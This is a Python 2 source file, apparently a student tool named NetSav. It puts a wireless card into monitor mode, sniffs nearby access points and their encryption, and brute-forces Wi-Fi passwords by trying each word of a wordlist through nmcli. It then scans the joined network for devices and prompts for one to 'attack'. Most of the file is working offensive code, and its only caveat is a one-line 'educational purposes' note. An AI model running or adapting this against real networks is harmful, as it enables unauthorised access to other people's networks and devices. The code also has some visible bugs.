# Authors: Shir, Hodaya and Alexey
# Version: 1.0
# Date: 07/2019
# https://stackoverflow.com/questions/19311673/fetch-source-address-and-port-number-of-packet-scapy-script

# libraries
import argparse
import os
import subprocess
import re
import sys
import signal
import network
import socket
import netifaces as ni
from threading import Lock
from prettytable import PrettyTable
from time import sleep
try:
    from scapy.all import *
except ImportError:
    print("[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'")
    exit(1)

# Colours for print
GREEN = '\033[92m'
RED = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'

# Global variables
global ssid_list
global crypto_list
global s
global ap_index

# Strings
cstr_startAP = "Table Access Points"
cstr_endAP = "FIN"
cstr_tableID = "INDEX"
cstr_tableSSID = "SSID"
cstr_tableBSSID = "BSSID"
cstr_tableChannel = "CHANNEL"
cstr_DEVICES = "DEVICES"
cstr_Crypto = "CRYPTO"

# Print header of access points table 
def PrintAPTable():
    print('   ' + cstr_startAP.center(85,'_'))
    print('   '+ cstr_tableChannel.center(26,' ') + cstr_tableBSSID.center(10,' ') + cstr_Crypto.center(22,' ') + cstr_tableSSID.center(35,' '))	


# Print our logo
def logo():
    OurLogo = ""
    for row in range(7):
	i = 7 - row
	#  Printing Stars '*' in Right Angle Triangle Shape
	for j in range(0, i):
	    OurLogo = OurLogo + "*"
	for j in range(0, 7-i):
	    OurLogo = OurLogo + " "
	OurLogo = OurLogo + "  "
	#  Printing Stars '*' in A Shape		
	for col in range(5):
	    if(col == 0 or col == 4) or ((row == 0 or row == 3) and (col > 0 and col < 4)):
	        OurLogo = OurLogo + "*"
	    else:
		OurLogo = OurLogo + " "
	OurLogo = OurLogo + "  "
	#  Printing Stars '*' in S Shape		
	for col in range(5):
	    if((row == 0 or row == 3 or row == 6) and (col > 0 and col < 4)) or ((row == 1 or row == 2) and (col == 0)) or ((row == 4 or row == 5) and (col == 4)):
	        OurLogo = OurLogo + "*"
	    else:
		OurLogo = OurLogo + " "
	OurLogo = OurLogo + "  "
	#  Printing Stars '*' in H Shape
	for col in range(5):
	    if(col == 0 or col == 3) or (row == 3 and (col > 0 and col < 4)):
	        OurLogo = OurLogo + "*"
	    else:
		OurLogo = OurLogo + " "
	OurLogo = OurLogo + "  "
	#  Printing Stars '*' in Left Angle Triangle Shape
	for j in range(0, 7-i):
	    OurLogo = OurLogo + " "
	for j in range(0, i):
	    OurLogo = OurLogo + "*"
	OurLogo = OurLogo + "\n"
    print(BOLD + OurLogo + ENDC)


# Print banner with info
def banner():
    print(BOLD + "\n+--------------------------------------------------------------------------------------------+" + ENDC)
    print(BOLD + "|NetSav v1.0                                                                                 |" + ENDC)
    print(BOLD + "|Coded by Alexey, Hodaya & Shir                                                              |" + ENDC)
    print(BOLD + "+--------------------------------------------------------------------------------------------+\n" + ENDC)

# Function to handle Crtl+C
def signal_handler(signal, frame):
    print(RED + '\n=====================' + ENDC)
    print(RED + '[-] Execution aborted' + ENDC)
    print(RED + '=====================' + ENDC)
    os.system("kill -9 " + str(os.getpid()))
    sys.exit(1)

# Function of signal exit
def signal_exit(signal, frame):
    print "Signal exit"
    sys.exit(1)

# Function check that script run with sudo
def check_root():
    # Only root    	
    if not os.geteuid() == 0:
        print(RED + "[-] Script must run with 'sudo'" + ENDC)
        exit(1)

# Function sniffing packets
def sniffpackets(packet):
    try:
	SRCMAC = packet[0].addr2
	DSTMAC = packet[0].addr1
	BSSID = packet[0].addr3
    except:
	#print("Cannot read MAC address")
	#print str(packet).encode("hex")
	sys.exc_clear()
        return

    try:
	SSIDSize = packet[0][Dot11Elt].len
	SSID = packet[0][Dot11Elt].info
    except:
	SSID = ""
	SSIDSize = 0
    if (packet[0].type == 0):
	ST = packet[0][Dot11].subtype
	if (str(ST) == "8" and SSID != "" and DSTMAC.lower() == "ff:ff:ff:ff:ff:ff"):
	    p = packet[Dot11Elt]
	    cap = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}" "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
	    channel = None
	    crypto = set()
	    while isinstance(p, Dot11Elt):
	        try:
		    if (p.ID == 3):
		        channel = ord(p.info)
		    elif (p.ID == 48):
		        crypto.add("WPA2")
		    elif (p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00')):
		        crypto.add("WPA")
		except:
		    pass
		p = p.payload
            if (not crypto):
                if ('privacy' in cap):
		    crypto.add("WEP")
		else:
		    crypto.add("OPN")
            if (SRCMAC not in ssid_list.keys()):
		if ('0050f204104a000110104400010210' in str(packet).encode("hex")):
	            crypto.add("WPS")
		print "[+] New AP {0:5}\t{1:20}\t{2:20}\t{3:5}".format(channel, BSSID, ' / '.join(crypto), SSID)
		ssid_list[SRCMAC] = SSID
                ap_index[len(ssid_list)] = [SSID, crypto]
                crypto_list[SRCMAC] = crypto
# Function set wlan to mode monitor 
def setup_monitor(iface):
    print(GREEN + "[+] Setting up sniff options..." + ENDC)
    os.system('ifconfig ' + iface + ' down')
    try:
        os.system('iwconfig ' + iface + ' mode monitor')
    except:
	print(RED + "[!] Failed to setup monitor mode" + ENDC)
	sys.exit(1)
    os.system('ifconfig ' + iface + ' up')
    return iface

# Function connect to a wifi 'ssid' with password 'pwd'
def wifi_connect(ssid, pwd):
    sta_if = network.WLAN(network.STA_IF)
    ap_if = network.WLAN(network.AP_IF)
    if ap_if.active():
        ap_if.active(False)
    if not sta_if.isconnected():
        print('Connecting to network {}...'.format(ssid))
        sta_if.active(True)
        sta_if.connect(ssid, pwd)
        while not sta_if.isconnected():
            pass
        print("Connected!")
    return 'IP address: %s' % sta_if.ifconfig()[0] 

# Function scanning wifi devices and return: your ip, router ip and device ips in network 
def scanIP(wlan):
    # use table to display devices
    BTable = PrettyTable(['Index', 'IP', 'KIND'])
    ni.ifaddresses(wlan)
    BASE_IP = ni.ifaddresses(wlan)[ni.AF_INET][0]['addr']
    BTable.add_row([0, BASE_IP, 'YOUR'])
    gws = ni.gateways()
    ROUTER_IP = gws['default'].values()[0][0]
    BTable.add_row([0, ROUTER_IP, 'ROUTER'])
    IPs = []
    p = subprocess.Popen(['sh', 'scan.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = p.communicate()
    ips = str(stdout).split('\n')
    for (i, ip) in enumerate(ips):
        if (ip != BASE_IP and ip != ROUTER_IP and ip != ''):
            IPs.append(ip)
            BTable.add_row([str(i+1), ip, 'DEVICE'])
    print(BTable)
    return BASE_IP, ROUTER_IP, IPs

# Function fo brute force, hack password
def BruteForce(SSID):
    file = open('bruteforce.txt', 'r') 
    txt = file.read()
    file.close()
    passwords = txt.splitlines()
    for password in passwords:
        # Example: $nmcli device wifi connect G3 password tomy2015
        process = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', SSID, 'password', password], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.wait()
        stdout, stderr = process.communicate()
        print(stdout)
        print(stderr)
        if ('Error' in stdout):
            print('Yes')
        if (stderr == ''):
            print(GREEN + 'Password: ' + password + ENDC)
            return False
    return True

# Function connect to network and return: your ip, router ip and device ips in network 
def connectTONETWORK(ap_index, ap_choice): 
    SSID = ap_index[ap_choice][0]
    CRYPTO = ap_index[ap_choice][1]
    BASE_IP = '' 
    ROUTER_IP = ''
    IPs = []
    flag_crypto = False
    for c in CRYPTO:
        if (c == 'OPN'):
            flag_crypto = True
    if (flag_crypto):
        # Example: $nmcli device wifi connect Ariel_University
        process = subprocess.Popen(['nmcli', 'device', 'wifi', 'connect', SSID], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        process.wait()
        stdout, stderr = process.communicate()
        if (stderr != '' or stdout == ''):
            print(RED + "[-] No network with SSID" + ENDC)
            exit(0)
        else:
            print(GREEN + "[+] Connect to " + str(newiface) + "...\n" + ENDC)
            BASE_IP, ROUTER_IP, IPs = scanIP(results.wlan)
    else:
        flag = BruteForce(SSID)
        if (flag):
            print(RED + "[-] No network with SSID" + ENDC)
            exit(0)
        else:
            print(GREEN + "[+] Connect to " + str(newiface) + "...\n" + ENDC)
            BASE_IP, ROUTER_IP, IPs = scanIP(results.wlan)
    return BASE_IP, ROUTER_IP, IPs 


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    logo()
    # Parser of arguments from command line	
    parser = argparse.ArgumentParser(description='[Coded by Shir, Hodaya & Alexey]', epilog="Please use the program for educational purposes.")
    parser.add_argument('-w', action='store', dest='wlan', type = str, help='iface for monitoring')
    parser.add_argument('-v', action='version', version='%(prog)s 1.0')
    results = parser.parse_args()
    banner()
    check_root()
    if "mon" not in str(results.wlan):
        newiface = setup_monitor(results.wlan)
    else:
	newiface = str(results.wlan)
    ssid_list = {}
    crypto_list = {}
    ap_index = {}
    s = conf.L2socket(iface=newiface)
    print(GREEN + "[+] Sniffing on interface " + str(newiface) + "...\n" + ENDC)
    PrintAPTable()
    try: 
        sniff(iface=newiface, prn=sniffpackets, store = 0)
    except Exception as ex:
        #print(ex)
        pass
    print('   ' + cstr_endAP.center(85,'-'))

    # Chose wanted AP
    print("Input the index of the AP you want to scan: ")	
    ap_choice = input()
    x = 1
    # Check your choose
    if (type(ap_choice) == type(x) and ap_choice <= len(ssid_list) and ap_choice > 0):	
        BASE_IP, ROUTER_IP, IPs = connectTONETWORK(ap_index, ap_choice) 
    else:		
	print(RED + "[-] Illegal index" + ENDC)
        exit(0)
    
    # Chose wanted device
    print("Input the index of the device you want to attack: ")	
    ip_choice = input()
    # Check your choose
    if (type(ip_choice) == type(x) and ip_choice < len(IPs) and ip_choice > -1):	
        pass
    else:		
	print(RED + "[-] Illegal index" + ENDC)
        exit(0)
